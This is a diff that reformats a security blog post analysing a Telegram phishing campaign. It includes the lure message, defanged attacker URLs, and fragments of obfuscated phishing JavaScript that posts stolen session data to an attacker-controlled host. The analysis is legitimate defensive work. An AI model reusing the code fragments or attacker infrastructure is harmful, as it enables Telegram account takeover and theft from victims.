@@ -32,14 +32,14 @@ The initial contact was with a Telegram message, as always:
 ![Telegram message](/assets/img/telegram_message.png)
 
 Translated, the message states:
-```
-Dear friends, good day! I would like to address you with an important request.  
 
-The fact is that I am taking part in the contest “The Best Obstetrician-Gynecologist in Moscow”
+> Dear friends, good day! I would like to address you with an important request.  
+> 
+> The fact is that I am taking part in the contest "The Best Obstetrician-Gynecologist in Moscow"
+> 
+> For me it is very important, so I very much ask you to support me.
+> Thank you very much in advance to everyone who responded, have a good day!
 
-For me it is very important, so I very much ask you to support me.
-Thank you very much in advance to everyone who responded, have a good day!
-```
 
 So, of course I wanted to show my support: click the link (`https://tinyurl[.]com/gynecologmsc`), vote for my favorite, and you continue with my day!
 
@@ -153,11 +153,11 @@ Looking deeper into the Telegram login code, the code fetches the page from `./p
 However, this is where the phishing website loads a different page (located at `./2xdtpe8hc3yy.js`)
 ### MiniApps
 The code enrolls the user for a couple of Telegram miniApps via the [messages.requestWebView](https://core.telegram.org/method/messages.requestWebView) API endpoint and sends the response back to the server. Now you might ask, why the heck should I care about those miniApps, so let me copy-paste the Telegram explanation:
-```
-Interactive [HTML5 Mini Apps](https://core.telegram.org/bots/webapps) on Telegram can completely replace **any website**.
 
-They support [seamless authorization](https://telegram.org/blog/privacy-discussions-web-bots#meet-seamless-web-bots), [integrated payments](https://core.telegram.org/bots/payments) via multiple payment providers (with _Google Pay_ and _Apple Pay_ out of the box), delivering tailored push notifications to users, and [much more](https://core.telegram.org/bots).
-```
+> Interactive [HTML5 Mini Apps](https://core.telegram.org/bots/webapps) on Telegram can completely replace **any website**.
+> 
+> They support [seamless authorization](https://telegram.org/blog/privacy-discussions-web-bots#meet-seamless-web-bots), [integrated payments](https://core.telegram.org/bots/payments) via multiple payment providers (with _Google Pay_ and _Apple Pay_ out of the box), delivering tailored push notifications to users, and [much more](https://core.telegram.org/bots).
+
 So they allow **integrated payments, seamless authorization and much more** (Yay!).
 
 The following miniApps are used:
@@ -195,9 +195,8 @@ w.post('/' + _0x37c264() + "/receive/" + _0x37c264(), {
 ```
 
 The full URL of the POST looks like this:
-```
-hxxps[://]telegram[.]org-org[.]ru/j4xQW/flow/0hhGae3FlGTazt
-```
+> hxxps[://]telegram[.]org-org[.]ru/j4xQW/flow/0hhGae3FlGTazt
+
 However the two random-looking bits from the URL do not matter, as they are randomly generated, as we can see from the way the URL is created:
 ```js
       var _0x1251db = encodeURIComponent(JSON.stringify({
